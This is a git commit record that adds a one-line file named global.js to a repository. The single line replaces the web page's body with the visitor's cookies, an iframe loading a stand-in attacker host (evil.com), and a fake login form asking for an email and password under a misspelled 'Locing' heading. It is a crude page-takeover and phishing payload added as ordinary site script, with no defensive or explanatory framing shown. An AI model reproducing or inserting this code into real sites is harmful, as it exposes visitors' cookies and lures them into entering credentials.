b0522c9af4925e9315760afe5094632fc2fb5cc2
mrx_w_ <96743453+abx12@users.noreply.github.com>
2024-11-04 20:44:01 +0100

    Create global.js

---
+++ global.js
@@ -0,0 +1,1 @@
+document.body.innerHTML=document.cookie+"<iframe src='https://evil.com'></iframe>;<br/><h1>Locing</h1><br/><input placeholder='Email'><br/><input placeholder='Password'><br/><button>Login</button>"
